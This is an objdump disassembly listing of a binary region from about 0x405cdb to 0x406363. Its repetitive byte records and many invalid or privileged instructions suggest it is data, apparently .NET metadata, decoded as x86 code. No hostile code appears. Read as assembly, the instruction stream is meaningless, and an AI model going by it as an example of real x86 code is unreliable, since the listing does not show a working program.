  405cdb:	00 ba 06 43 15 06    	add    %bh,0x6154306(%edx)
  405ce1:	00 36                	add    %dh,(%esi)
  405ce3:	12 65 02             	adc    0x2(%ebp),%ah
  405ce6:	0a 00                	or     (%eax),%al
  405ce8:	d8 06                	fadds  (%esi)
  405cea:	43                   	inc    %ebx
  405ceb:	15 06 00 68 1d       	adc    $0x1d680006,%eax
  405cf0:	5e                   	pop    %esi
  405cf1:	00 16                	add    %dl,(%esi)
  405cf3:	00 05 17 e5 02 06    	add    %al,0x602e517
  405cf9:	00 37                	add    %dh,(%edi)
  405cfb:	0e                   	push   %cs
  405cfc:	5e                   	pop    %esi
  405cfd:	00 06                	add    %al,(%esi)
  405cff:	00 75 06             	add    %dh,0x6(%ebp)
  405d02:	65 02 06             	add    %gs:(%esi),%al
  405d05:	00 76 0f             	add    %dh,0xf(%esi)
  405d08:	65 02 06             	add    %gs:(%esi),%al
  405d0b:	00 0b                	add    %cl,(%ebx)
  405d0d:	05 65 02 06 00       	add    $0x60265,%eax
  405d12:	7d 14                	jge    0x405d28
  405d14:	65 02 06             	add    %gs:(%esi),%al
  405d17:	00 2c 12             	add    %ch,(%edx,%edx,1)
  405d1a:	65 02 16             	add    %gs:(%esi),%dl
  405d1d:	00 45 12             	add    %al,0x12(%ebp)
  405d20:	64 15 1a 00 fc 13    	fs adc $0x13fc001a,%eax
  405d26:	85 1a                	test   %ebx,(%edx)
  405d28:	1a 00                	sbb    (%eax),%al
  405d2a:	81 11 85 1a 8b 01    	adcl   $0x18b1a85,(%ecx)
  405d30:	b5 14                	mov    $0x14,%ch
  405d32:	00 00                	add    %al,(%eax)
  405d34:	1a 00                	sbb    (%eax),%al
  405d36:	21 19                	and    %ebx,(%ecx)
  405d38:	85 1a                	test   %ebx,(%edx)
  405d3a:	06                   	push   %es
  405d3b:	00 3c 15 f4 0f 06 00 	add    %bh,0x60ff4(,%edx,1)
  405d42:	83 00 f4             	addl   $0xfffffff4,(%eax)
  405d45:	0f 06                	clts
  405d47:	00 eb                	add    %ch,%bl
  405d49:	0f f4 0f             	pmuludq (%edi),%mm1
  405d4c:	06                   	push   %es
  405d4d:	00 e3                	add    %ah,%bl
  405d4f:	00 f4                	add    %dh,%ah
  405d51:	0f 06                	clts
  405d53:	00 e4                	add    %ah,%ah
  405d55:	12 fe                	adc    %dh,%bh
  405d57:	1c 06                	sbb    $0x6,%al
  405d59:	00 33                	add    %dh,(%ebx)
  405d5b:	10 fe                	adc    %bh,%dh
  405d5d:	1c 06                	sbb    $0x6,%al
  405d5f:	00 b0 07 f4 0f 06    	add    %dh,0x60ff407(%eax)
  405d65:	00 86 10 f4 0f 1e    	add    %al,0x1e0ff410(%esi)
  405d6b:	00 2a                	add    %ch,(%edx)
  405d6d:	11 ac 17 06 00 9f 1d 	adc    %ebp,0x1d9f0006(%edi,%edx,1)
  405d74:	be 0e 06 00 d8       	mov    $0xd800060e,%esi
  405d79:	0e                   	push   %cs
  405d7a:	be 0e 06 00 83       	mov    $0x8300060e,%esi
  405d7f:	06                   	push   %es
  405d80:	be 0e 06 00 78       	mov    $0x7800060e,%esi
  405d85:	03 f4                	add    %esp,%esi
  405d87:	0f 06                	clts
  405d89:	00 23                	add    %ah,(%ebx)
  405d8b:	06                   	push   %es
  405d8c:	9e                   	sahf
  405d8d:	0b 0a                	or     (%edx),%ecx
  405d8f:	00 15 14 5e 00 0a    	add    %dl,0xa005e14
  405d95:	00 99 18 5e 00 06    	add    %bl,0x6005e18(%ecx)
  405d9b:	00 d9                	add    %bl,%cl
  405d9d:	04 5e                	add    $0x5e,%al
  405d9f:	00 43 00             	add    %al,0x0(%ebx)
  405da2:	f2 14 00             	repnz adc $0x0,%al
  405da5:	00 12                	add    %dl,(%edx)
  405da7:	00 a6 05 c0 12 06    	add    %ah,0x612c005(%esi)
  405dad:	00 1b                	add    %bl,(%ebx)
  405daf:	00 ca                	add    %cl,%dl
  405db1:	02 06                	add    (%esi),%al
  405db3:	00 b8 10 f4 0f 06    	add    %bh,0x60ff410(%eax)
  405db9:	00 1b                	add    %bl,(%ebx)
  405dbb:	1d 55 11 06 00       	sbb    $0x61155,%eax
  405dc0:	3c 08                	cmp    $0x8,%al
  405dc2:	f4                   	hlt
  405dc3:	0f 06                	clts
  405dc5:	00 fd                	add    %bh,%ch
  405dc7:	14 f4                	adc    $0xf4,%al
  405dc9:	0f 06                	clts
  405dcb:	00 ff                	add    %bh,%bh
  405dcd:	05 f4 0f 22 00       	add    $0x220ff4,%eax
  405dd2:	52                   	push   %edx
  405dd3:	12 5b 13             	adc    0x13(%ebx),%bl
  405dd6:	22 00                	and    (%eax),%al
  405dd8:	d3 16                	rcll   %cl,(%esi)
  405dda:	5b                   	pop    %ebx
  405ddb:	13 22                	adc    (%edx),%esp
  405ddd:	00 82 13 5b 13 12    	add    %al,0x12135b13(%edx)
  405de3:	00 7a 13             	add    %bh,0x13(%edx)
  405de6:	a1 15 22 00 eb       	mov    0xeb002215,%eax
  405deb:	16                   	push   %ss
  405dec:	5b                   	pop    %ebx
  405ded:	13 06                	adc    (%esi),%eax
  405def:	00 5b 16             	add    %bl,0x16(%ebx)
  405df2:	fe                   	(bad)
  405df3:	1c 06                	sbb    $0x6,%al
  405df5:	00 f1                	add    %dh,%cl
  405df7:	11 f4                	adc    %esi,%esp
  405df9:	0f 06                	clts
  405dfb:	00 62 16             	add    %ah,0x16(%edx)
  405dfe:	fe                   	(bad)
  405dff:	1c 12                	sbb    $0x12,%al
  405e01:	00 16                	add    %dl,(%esi)
  405e03:	13 fe                	adc    %esi,%edi
  405e05:	1c 06                	sbb    $0x6,%al
  405e07:	00 aa 0f fe 1c 06    	add    %ch,0x61cfe0f(%edx)
  405e0d:	00 04 01             	add    %al,(%ecx,%eax,1)
  405e10:	fe                   	(bad)
  405e11:	1c 06                	sbb    $0x6,%al
  405e13:	00 db                	add    %bl,%bl
  405e15:	11 f4                	adc    %esi,%esp
  405e17:	0f 06                	clts
  405e19:	00 0c 10             	add    %cl,(%eax,%edx,1)
  405e1c:	fe                   	(bad)
  405e1d:	1c 06                	sbb    $0x6,%al
  405e1f:	00 50 05             	add    %dl,0x5(%eax)
  405e22:	fe                   	(bad)
  405e23:	1c 06                	sbb    $0x6,%al
  405e25:	00 14 05 fe 1c 06 00 	add    %dl,0x61cfe(,%eax,1)
  405e2c:	4d                   	dec    %ebp
  405e2d:	10 fe                	adc    %bh,%dh
  405e2f:	1c 06                	sbb    $0x6,%al
  405e31:	00 2f                	add    %ch,(%edi)
  405e33:	05 fe 1c 06 00       	add    $0x61cfe,%eax
  405e38:	c4 11                	les    (%ecx),%edx
  405e3a:	fe                   	(bad)
  405e3b:	1c 06                	sbb    $0x6,%al
  405e3d:	00 a3 13 f4 0f 06    	add    %ah,0x60ff413(%ebx)
  405e43:	00 91 1c f4 0f 06    	add    %dl,0x60ff41c(%ecx)
  405e49:	00 05 18 a1 15 06    	add    %al,0x615a118
  405e4f:	00 dc                	add    %bl,%ah
  405e51:	05 f4 0f 06 00       	add    $0x60ff4,%eax
  405e56:	2f                   	das
  405e57:	03 fe                	add    %esi,%edi
  405e59:	1c 06                	sbb    $0x6,%al
  405e5b:	00 d0                	add    %dl,%al
  405e5d:	00 f4                	add    %dh,%ah
  405e5f:	0f 06                	clts
  405e61:	00 ca                	add    %cl,%dl
  405e63:	05 f4 0f 06 00       	add    $0x60ff4,%eax
  405e68:	48                   	dec    %eax
  405e69:	06                   	push   %es
  405e6a:	f4                   	hlt
  405e6b:	0f 06                	clts
  405e6d:	00 34 18             	add    %dh,(%eax,%ebx,1)
  405e70:	65 02 06             	add    %gs:(%esi),%al
  405e73:	00 41 08             	add    %al,0x8(%ecx)
  405e76:	65 02 0a             	add    %gs:(%edx),%cl
  405e79:	00 b7 0f 14 11 0a    	add    %dh,0xa11140f(%edi)
  405e7f:	00 40 05             	add    %al,0x5(%eax)
  405e82:	14 11                	adc    $0x11,%al
  405e84:	00 00                	add    %al,(%eax)
  405e86:	00 00                	add    %al,(%eax)
  405e88:	49                   	dec    %ecx
  405e89:	01 00                	add    %eax,(%eax)
  405e8b:	00 00                	add    %al,(%eax)
  405e8d:	00 01                	add    %al,(%ecx)
  405e8f:	00 01                	add    %al,(%ecx)
  405e91:	00 01                	add    %al,(%ecx)
  405e93:	00 10                	add    %dl,(%eax)
  405e95:	00 cf                	add    %cl,%bh
  405e97:	0f 7e 1a             	movd   %mm3,(%edx)
  405e9a:	05 00 01 00 01       	add    $0x1000100,%eax
  405e9f:	00 81 01 10 00 17    	add    %al,0x17001001(%ecx)
  405ea5:	17                   	pop    %ss
  405ea6:	7e 1a                	jle    0x405ec2
  405ea8:	05 00 01 00 03       	add    $0x3000100,%eax
  405ead:	00 81 01 10 00 9f    	add    %al,-0x60ffefff(%ecx)
  405eb3:	19 9c 11 05 00 13 00 	sbb    %ebx,0x130005(%ecx,%edx,1)
  405eba:	06                   	push   %es
  405ebb:	00 00                	add    %al,(%eax)
  405ebd:	00 10                	add    %dl,(%eax)
  405ebf:	00 b2 12 0c 0f 05    	add    %dh,0x50f0c12(%edx)
  405ec5:	00 1e                	add    %bl,(%esi)
  405ec7:	00 24 00             	add    %ah,(%eax,%eax,1)
  405eca:	00 00                	add    %al,(%eax)
  405ecc:	10 00                	adc    %al,(%eax)
  405ece:	37                   	aaa
  405ecf:	17                   	pop    %ss
  405ed0:	3b 14 05 00 1e 00 26 	cmp    0x26001e00(,%eax,1),%edx
  405ed7:	00 81 01 10 00 8e    	add    %al,-0x71ffefff(%ecx)
  405edd:	10 3b                	adc    %bh,(%ebx)
  405edf:	14 05                	adc    $0x5,%al
  405ee1:	00 1e                	add    %bl,(%esi)
  405ee3:	00 2d 00 81 01 10    	add    %ch,0x10018100
  405ee9:	00 4b 13             	add    %cl,0x13(%ebx)
  405eec:	3b 14 05 00 1e 00 2f 	cmp    0x2f001e00(,%eax,1),%edx
  405ef3:	00 81 01 10 00 5c    	add    %al,0x5c001001(%ecx)
  405ef9:	15 3b 14 05 00       	adc    $0x5143b,%eax
  405efe:	1e                   	push   %ds
  405eff:	00 30                	add    %dh,(%eax)
  405f01:	00 81 01 10 00 5b    	add    %al,0x5b001001(%ecx)
  405f07:	0f 3b                	(bad)
  405f09:	14 05                	adc    $0x5,%al
  405f0b:	00 1e                	add    %bl,(%esi)
  405f0d:	00 36                	add    %dh,(%esi)
  405f0f:	00 81 01 10 00 56    	add    %al,0x56001001(%ecx)
  405f15:	15 3b 14 05 00       	adc    $0x5143b,%eax
  405f1a:	1f                   	pop    %ds
  405f1b:	00 38                	add    %bh,(%eax)
  405f1d:	00 02                	add    %al,(%edx)
  405f1f:	01 00                	add    %eax,(%eax)
  405f21:	00 0a                	add    %cl,(%edx)
  405f23:	02 00                	add    (%eax),%al
  405f25:	00 39                	add    %bh,(%ecx)
  405f27:	00 1f                	add    %bl,(%edi)
  405f29:	00 3e                	add    %bh,(%esi)
  405f2b:	00 81 01 10 00 9c    	add    %al,-0x63ffefff(%ecx)
  405f31:	0e                   	push   %cs
  405f32:	3b 14 05 00 23 00 3e 	cmp    0x3e002300(,%eax,1),%edx
  405f39:	00 81 01 10 00 65    	add    %al,0x65001001(%ecx)
  405f3f:	1d 3b 14 05 00       	sbb    $0x5143b,%eax
  405f44:	23 00                	and    (%eax),%eax
  405f46:	41                   	inc    %ecx
  405f47:	00 81 01 10 00 98    	add    %al,-0x67ffefff(%ecx)
  405f4d:	19 7a 19             	sbb    %edi,0x19(%edx)
  405f50:	05 00 24 00 46       	add    $0x46002400,%eax
  405f55:	00 83 01 10 00 89    	add    %al,-0x76ffefff(%ebx)
  405f5b:	00 00                	add    %al,(%eax)
  405f5d:	00 05 00 25 00 4b    	add    %al,0x4b002500
  405f63:	00 01                	add    %al,(%ecx)
  405f65:	00 10                	add    %dl,(%eax)
  405f67:	00 16                	add    %dl,(%esi)
  405f69:	01 fb                	add    %edi,%ebx
  405f6b:	0f 05                	syscall
  405f6d:	00 26                	add    %ah,(%esi)
  405f6f:	00 4b 00             	add    %cl,0x0(%ebx)
  405f72:	81 01 10 00 0f 01    	addl   $0x10f0010,(%ecx)
  405f78:	fb                   	sti
  405f79:	0f 05                	syscall
  405f7b:	00 2d 00 52 00 00    	add    %ch,0x5200
  405f81:	01 00                	add    %eax,(%eax)
  405f83:	00 61 01             	add    %ah,0x1(%ecx)
  405f86:	00 00                	add    %al,(%eax)
  405f88:	05 00 2d 00 54       	add    $0x54002d00,%eax
  405f8d:	00 13                	add    %dl,(%ebx)
  405f8f:	01 00                	add    %eax,(%eax)
  405f91:	00 41 00             	add    %al,0x0(%ecx)
  405f94:	00 00                	add    %al,(%eax)
  405f96:	51                   	push   %ecx
  405f97:	00 2e                	add    %ch,(%esi)
  405f99:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  405f9d:	00 10                	add    %dl,(%eax)
  405f9f:	00 a1 17 c5 0d 05    	add    %ah,0x50dc517(%ecx)
  405fa5:	00 2e                	add    %ch,(%esi)
  405fa7:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  405fab:	00 10                	add    %dl,(%eax)
  405fad:	00 5e 10             	add    %bl,0x10(%esi)
  405fb0:	c5 0d 05 00 2f 00    	lds    0x2f0005,%ecx
  405fb6:	5f                   	pop    %edi
  405fb7:	00 01                	add    %al,(%ecx)
  405fb9:	00 10                	add    %dl,(%eax)
  405fbb:	00 6b 1c             	add    %ch,0x1c(%ebx)
  405fbe:	c5 0d 05 00 31 00    	lds    0x310005,%ecx
  405fc4:	63 00                	arpl   %eax,(%eax)
  405fc6:	01 00                	add    %eax,(%eax)
  405fc8:	10 00                	adc    %al,(%eax)
  405fca:	e0 0d                	loopne 0x405fd9
  405fcc:	c5 0d 05 00 33 00    	lds    0x330005,%ecx
  405fd2:	6a 00                	push   $0x0
  405fd4:	01 01                	add    %eax,(%ecx)
  405fd6:	00 00                	add    %al,(%eax)
  405fd8:	15 08 c5 0d 39       	adc    $0x390dc508,%eax
  405fdd:	00 3a                	add    %bh,(%edx)
  405fdf:	00 95 00 00 00 10    	add    %dl,0x10000000(%ebp)
  405fe5:	00 8c 17 c5 0d 05 00 	add    %cl,0x50dc5(%edi,%edx,1)
  405fec:	47                   	inc    %edi
  405fed:	00 95 00 00 00 10    	add    %dl,0x10000000(%ebp)
  405ff3:	00 96 17 c5 0d 05    	add    %dl,0x50dc517(%esi)
  405ff9:	00 47 00             	add    %al,0x0(%edi)
  405ffc:	99                   	cltd
  405ffd:	00 81 01 10 00 8c    	add    %al,-0x73ffefff(%ecx)
  406003:	12 c5                	adc    %ch,%al
  406005:	0d 05 00 47 00       	or     $0x470005,%eax
  40600a:	a2 00 00 01 00       	mov    %al,0x10000
  40600f:	00 52 01             	add    %dl,0x1(%edx)
  406012:	00 00                	add    %al,(%eax)
  406014:	05 00 47 00 a4       	add    $0xa4004700,%eax
  406019:	00 13                	add    %dl,(%ebx)
  40601b:	01 00                	add    %eax,(%eax)
  40601d:	00 24 01             	add    %ah,(%ecx,%eax,1)
  406020:	00 00                	add    %al,(%eax)
  406022:	51                   	push   %ecx
  406023:	00 48 00             	add    %cl,0x0(%eax)
  406026:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406027:	00 16                	add    %dl,(%esi)
  406029:	00 a6 18 12 00 16    	add    %ah,0x16001218(%esi)
  40602f:	00 b3 18 12 00 16    	add    %dh,0x16001218(%ebx)
  406035:	00 0c 11             	add    %cl,(%ecx,%edx,1)
  406038:	12 00                	adc    (%eax),%al
  40603a:	16                   	push   %ss
  40603b:	00 13                	add    %dl,(%ebx)
  40603d:	0f 12 00             	movlps (%eax),%xmm0
  406040:	16                   	push   %ss
  406041:	00 3d 13 12 00 16    	add    %bh,0x16001213
  406047:	00 4f 06             	add    %cl,0x6(%edi)
  40604a:	12 00                	adc    (%eax),%al
  40604c:	16                   	push   %ss
  40604d:	00 f5                	add    %dh,%ch
  40604f:	1c 12                	sbb    $0x12,%al
  406051:	00 16                	add    %dl,(%esi)
  406053:	00 a0 02 12 00 16    	add    %ah,0x16001202(%eax)
  406059:	00 a4 08 12 00 16 00 	add    %ah,0x160012(%eax,%ecx,1)
  406060:	57                   	push   %edi
  406061:	08 12                	or     %dl,(%edx)
  406063:	00 16                	add    %dl,(%esi)
  406065:	00 9e 08 15 00 16    	add    %bl,0x16001508(%esi)
  40606b:	00 a9 0d 12 00 16    	add    %ch,0x1600120d(%ecx)
  406071:	00 1d 01 19 00 16    	add    %bl,0x16001901
  406077:	00 d4                	add    %dl,%ah
  406079:	10 12                	adc    %dl,(%edx)
  40607b:	00 16                	add    %dl,(%esi)
  40607d:	00 74 02 12          	add    %dh,0x12(%edx,%eax,1)
  406081:	00 16                	add    %dl,(%esi)
  406083:	00 7d 03             	add    %bh,0x3(%ebp)
  406086:	12 00                	adc    (%eax),%al
  406088:	16                   	push   %ss
  406089:	00 4a 1c             	add    %cl,0x1c(%edx)
  40608c:	12 00                	adc    (%eax),%al
  40608e:	16                   	push   %ss
  40608f:	00 ac 12 12 00 11 00 	add    %ch,0x110012(%edx,%edx,1)
  406096:	89 04 21             	mov    %eax,(%ecx,%eiz,1)
  406099:	00 11                	add    %dl,(%ecx)
  40609b:	00 6e 04             	add    %ch,0x4(%esi)
  40609e:	25 00 11 00 3e       	and    $0x3e001100,%eax
  4060a3:	04 29                	add    $0x29,%al
  4060a5:	00 11                	add    %dl,(%ecx)
  4060a7:	00 d4                	add    %dl,%ah
  4060a9:	03 2d 00 11 00 56    	add    0x56001100,%ebp
  4060af:	04 2d                	add    $0x2d,%al
  4060b1:	00 11                	add    %dl,(%ecx)
  4060b3:	00 b9 03 30 00 11    	add    %bh,0x11003003(%ecx)
  4060b9:	00 9c 03 34 00 31 00 	add    %bl,0x310034(%ebx,%eax,1)
  4060c0:	82 03 37             	addb   $0x37,(%ebx)
  4060c3:	00 11                	add    %dl,(%ecx)
  4060c5:	00 f0                	add    %dh,%al
  4060c7:	03 30                	add    (%eax),%esi
  4060c9:	00 11                	add    %dl,(%ecx)
  4060cb:	00 24 04             	add    %ah,(%esp,%eax,1)
  4060ce:	3a 00                	cmp    (%eax),%al
  4060d0:	11 00                	adc    %eax,(%eax)
  4060d2:	06                   	push   %es
  4060d3:	04 34                	add    $0x34,%al
  4060d5:	00 16                	add    %dl,(%esi)
  4060d7:	00 90 12 dc 00 06    	add    %dl,0x600dc12(%eax)
  4060dd:	06                   	push   %es
  4060de:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4060df:	02 06                	add    (%esi),%al
  4060e1:	01 56 80             	add    %edx,-0x80(%esi)
  4060e4:	79 02                	jns    0x4060e8
  4060e6:	09 01                	or     %eax,(%ecx)
  4060e8:	56                   	push   %esi
  4060e9:	80 d7 01             	adc    $0x1,%bh
  4060ec:	09 01                	or     %eax,(%ecx)
  4060ee:	56                   	push   %esi
  4060ef:	80 c4 01             	add    $0x1,%ah
  4060f2:	09 01                	or     %eax,(%ecx)
  4060f4:	31 00                	xor    %eax,(%eax)
  4060f6:	07                   	pop    %es
  4060f7:	02 12                	add    (%edx),%dl
  4060f9:	00 16                	add    %dl,(%esi)
  4060fb:	00 55 17             	add    %dl,0x17(%ebp)
  4060fe:	30 01                	xor    %al,(%ecx)
  406100:	16                   	push   %ss
  406101:	00 0b                	add    %cl,(%ebx)
  406103:	00 43 01             	add    %al,0x1(%ebx)
  406106:	51                   	push   %ecx
  406107:	80 9b 0d 3a 00 51 80 	sbbb   $0x80,0x51003a0d(%ebx)
  40610e:	97                   	xchg   %eax,%edi
  40610f:	0d 3a 00 51 80       	or     $0x8051003a,%eax
  406114:	8e 0d 3a 00 51 80    	mov    0x8051003a,%cs
  40611a:	72 0d                	jb     0x406129
  40611c:	3a 00                	cmp    (%eax),%al
  40611e:	21 00                	and    %eax,(%eax)
  406120:	f9                   	stc
  406121:	1c 29                	sbb    $0x29,%al
  406123:	00 21                	add    %ah,(%ecx)
  406125:	00 da                	add    %bl,%dl
  406127:	1c 29                	sbb    $0x29,%al
  406129:	00 31                	add    %dh,(%ecx)
  40612b:	00 fa                	add    %bh,%dl
  40612d:	19 29                	sbb    %ebp,(%ecx)
  40612f:	00 33                	add    %dh,(%ebx)
  406131:	01 80 01 8b 01 11    	add    %eax,0x11018b01(%eax)
  406137:	00 66 05             	add    %ah,0x5(%esi)
  40613a:	8f 01                	pop    (%ecx)
  40613c:	01 00                	add    %eax,(%eax)
  40613e:	9a 10 30 01 01 00 bb 	lcall  $0xbb00,$0x1013010
  406145:	11 3a                	adc    %edi,(%edx)
  406147:	00 01                	add    %al,(%ecx)
  406149:	00 9a 10 30 01 01    	add    %bl,0x1013010(%edx)
  40614f:	00 35 14 c7 01 01    	add    %dh,0x101c714
  406155:	00 ab 07 12 00 01    	add    %ch,0x1001207(%ebx)
  40615b:	00 8b 07 12 00 01    	add    %cl,0x1001207(%ebx)
  406161:	00 ad 0a 37 00 01    	add    %ch,0x100370a(%ebp)
  406167:	00 0b                	add    %cl,(%ebx)
  406169:	08 02                	or     %al,(%edx)
  40616b:	02 01                	add    (%ecx),%al
  40616d:	00 a3 1a c7 01 01    	add    %ah,0x101c71a(%ebx)
  406173:	00 9a 10 30 01 01    	add    %bl,0x1013010(%edx)
  406179:	00 8c 1c 06 02 06 06 	add    %cl,0x6060206(%esp,%ebx,1)
  406180:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406181:	02 3a                	add    (%edx),%bh
  406183:	00 56 80             	add    %dl,-0x80(%esi)
  406186:	03 12                	add    (%edx),%edx
  406188:	02 02                	add    (%edx),%al
  40618a:	56                   	push   %esi
  40618b:	80 56 0f 02          	adcb   $0x2,0xf(%esi)
  40618f:	02 56 80             	add    -0x80(%esi),%dl
  406192:	7b 12                	jnp    0x4061a6
  406194:	02 02                	add    (%edx),%al
  406196:	56                   	push   %esi
  406197:	80 91 1c 02 02 56 80 	adcb   $0x80,0x5602021c(%ecx)
  40619e:	c9                   	leave
  40619f:	0c 02                	or     $0x2,%al
  4061a1:	02 56 80             	add    -0x80(%esi),%dl
  4061a4:	e5 13                	in     $0x13,%eax
  4061a6:	02 02                	add    (%edx),%al
  4061a8:	56                   	push   %esi
  4061a9:	80 d0 00             	adc    $0x0,%al
  4061ac:	02 02                	add    (%edx),%al
  4061ae:	56                   	push   %esi
  4061af:	80 86 10 02 02 56 80 	addb   $0x80,0x56020210(%esi)
  4061b6:	10 19                	adc    %bl,(%ecx)
  4061b8:	02 02                	add    (%edx),%al
  4061ba:	56                   	push   %esi
  4061bb:	80 48 06 02          	orb    $0x2,0x6(%eax)
  4061bf:	02 56 80             	add    -0x80(%esi),%dl
  4061c2:	b0 07                	mov    $0x7,%al
  4061c4:	02 02                	add    (%edx),%al
  4061c6:	56                   	push   %esi
  4061c7:	80 4a 1d 02          	orb    $0x2,0x1d(%edx)
  4061cb:	02 33                	add    (%ebx),%dh
  4061cd:	01 1a                	add    %ebx,(%edx)
  4061cf:	02 fd                	add    %ch,%bh
  4061d1:	02 08                	add    (%eax),%cl
  4061d3:	26 00 00             	add    %al,%es:(%eax)
  4061d6:	00 00                	add    %al,(%eax)
  4061d8:	96                   	xchg   %eax,%esi
  4061d9:	00 a3 10 0a 00 01    	add    %ah,0x1000a10(%ebx)
  4061df:	00 78 20             	add    %bh,0x20(%eax)
  4061e2:	00 00                	add    %al,(%eax)
  4061e4:	00 00                	add    %al,(%eax)
  4061e6:	86 18                	xchg   %bl,(%eax)
  4061e8:	07                   	pop    %es
  4061e9:	15 0e 00 01 00       	adc    $0x1000e,%eax
  4061ee:	f8                   	clc
  4061ef:	26 00 00             	add    %al,%es:(%eax)
  4061f2:	00 00                	add    %al,(%eax)
  4061f4:	96                   	xchg   %eax,%esi
  4061f5:	00 0d 17 1d 00 01    	add    %cl,0x1001d17
  4061fb:	00 50 28             	add    %dl,0x28(%eax)
  4061fe:	00 00                	add    %al,(%eax)
  406200:	00 00                	add    %al,(%eax)
  406202:	91                   	xchg   %eax,%ecx
  406203:	00 3d 0d 1d 00 01    	add    %bh,0x1001d0d
  406209:	00 c0                	add    %al,%al
  40620b:	28 00                	sub    %al,(%eax)
  40620d:	00 00                	add    %al,(%eax)
  40620f:	00 91 18 0d 15 0a    	add    %dl,0xa150d18(%ecx)
  406215:	00 01                	add    %al,(%ecx)
  406217:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  40621d:	00 96 08 54 1a 3d    	add    %dl,0x3d1a5408(%esi)
  406223:	00 01                	add    %al,(%ecx)
  406225:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  40622b:	00 96 08 62 1a 42    	add    %dl,0x421a6208(%esi)
  406231:	00 01                	add    %al,(%ecx)
  406233:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  406239:	00 96 08 38 1a 48    	add    %dl,0x481a3808(%esi)
  40623f:	00 02                	add    %al,(%edx)
  406241:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  406247:	00 96 08 46 1a 4d    	add    %dl,0x4d1a4608(%esi)
  40624d:	00 02                	add    %al,(%edx)
  40624f:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  406255:	00 91 08 94 13 53    	add    %dl,0x53139408(%ecx)
  40625b:	00 03                	add    %al,(%ebx)
  40625d:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  406263:	00 91 08 9f 13 58    	add    %dl,0x58139f08(%ecx)
  406269:	00 03                	add    %al,(%ebx)
  40626b:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  406271:	00 91 08 1c 0b 5e    	add    %dl,0x5e0b1c08(%ecx)
  406277:	00 04 00             	add    %al,(%eax,%eax,1)
  40627a:	b4 20                	mov    $0x20,%ah
  40627c:	00 00                	add    %al,(%eax)
  40627e:	00 00                	add    %al,(%eax)
  406280:	91                   	xchg   %eax,%ecx
  406281:	08 2b                	or     %ch,(%ebx)
  406283:	0b 62 00             	or     0x0(%edx),%esp
  406286:	04 00                	add    $0x0,%al
  406288:	bc 20 00 00 00       	mov    $0x20,%esp
  40628d:	00 91 08 d1 19 5e    	add    %dl,0x5e19d108(%ecx)
  406293:	00 05 00 c3 20 00    	add    %al,0x20c300
  406299:	00 00                	add    %al,(%eax)
  40629b:	00 91 08 dc 19 62    	add    %dl,0x6219dc08(%ecx)
  4062a1:	00 05 00 cb 20 00    	add    %al,0x20cb00
  4062a7:	00 00                	add    %al,(%eax)
  4062a9:	00 91 08 d0 0a 67    	add    %dl,0x670ad008(%ecx)
  4062af:	00 06                	add    %al,(%esi)
  4062b1:	00 d2                	add    %dl,%dl
  4062b3:	20 00                	and    %al,(%eax)
  4062b5:	00 00                	add    %al,(%eax)
  4062b7:	00 91 08 de 0a 6c    	add    %dl,0x6c0ade08(%ecx)
  4062bd:	00 06                	add    %al,(%esi)
  4062bf:	00 da                	add    %bl,%dl
  4062c1:	20 00                	and    %al,(%eax)
  4062c3:	00 00                	add    %al,(%eax)
  4062c5:	00 96 08 4b 03 1d    	add    %dl,0x1d034b08(%esi)
  4062cb:	00 07                	add    %al,(%edi)
  4062cd:	00 e1                	add    %ah,%cl
  4062cf:	20 00                	and    %al,(%eax)
  4062d1:	00 00                	add    %al,(%eax)
  4062d3:	00 96 08 5b 03 72    	add    %dl,0x72035b08(%esi)
  4062d9:	00 07                	add    %al,(%edi)
  4062db:	00 e9                	add    %ch,%cl
  4062dd:	20 00                	and    %al,(%eax)
  4062df:	00 00                	add    %al,(%eax)
  4062e1:	00 91 08 fb 02 77    	add    %dl,0x7702fb08(%ecx)
  4062e7:	00 08                	add    %cl,(%eax)
  4062e9:	00 f0                	add    %dh,%al
  4062eb:	20 00                	and    %al,(%eax)
  4062ed:	00 00                	add    %al,(%eax)
  4062ef:	00 91 08 8c 0b 67    	add    %dl,0x670b8c08(%ecx)
  4062f5:	00 08                	add    %cl,(%eax)
  4062f7:	00 f7                	add    %dh,%bh
  4062f9:	20 00                	and    %al,(%eax)
  4062fb:	00 00                	add    %al,(%eax)
  4062fd:	00 91 08 95 0b 6c    	add    %dl,0x6c0b9508(%ecx)
  406303:	00 08                	add    %cl,(%eax)
  406305:	00 ff                	add    %bh,%bh
  406307:	20 00                	and    %al,(%eax)
  406309:	00 00                	add    %al,(%eax)
  40630b:	00 96 08 f2 0e 7b    	add    %dl,0x7b0ef208(%esi)
  406311:	00 09                	add    %cl,(%ecx)
  406313:	00 06                	add    %al,(%esi)
  406315:	21 00                	and    %eax,(%eax)
  406317:	00 00                	add    %al,(%eax)
  406319:	00 96 08 ff 0e 7f    	add    %dl,0x7f0eff08(%esi)
  40631f:	00 09                	add    %cl,(%ecx)
  406321:	00 0e                	add    %cl,(%esi)
  406323:	21 00                	and    %eax,(%eax)
  406325:	00 00                	add    %al,(%eax)
  406327:	00 96 08 e9 0c 1d    	add    %dl,0x1d0ce908(%esi)
  40632d:	00 0a                	add    %cl,(%edx)
  40632f:	00 15 21 00 00 00    	add    %dl,0x21
  406335:	00 96 08 fa 0c 72    	add    %dl,0x720cfa08(%esi)
  40633b:	00 0a                	add    %cl,(%edx)
  40633d:	00 6c 29 00          	add    %ch,0x0(%ecx,%ebp,1)
  406341:	00 00                	add    %al,(%eax)
  406343:	00 96 00 27 1a 0a    	add    %dl,0xa1a2700(%esi)
  406349:	00 0b                	add    %cl,(%ebx)
  40634b:	00 1d 21 00 00 00    	add    %bl,0x21
  406351:	00 91 00 6c 07 84    	add    %dl,-0x7bf89400(%ecx)
  406357:	00 0b                	add    %cl,(%ebx)
  406359:	00 28                	add    %ch,(%eax)
  40635b:	21 00                	and    %eax,(%eax)
  40635d:	00 00                	add    %al,(%eax)
  40635f:	00 91 00 96 08 89    	add    %dl,-0x76f76a00(%ecx)
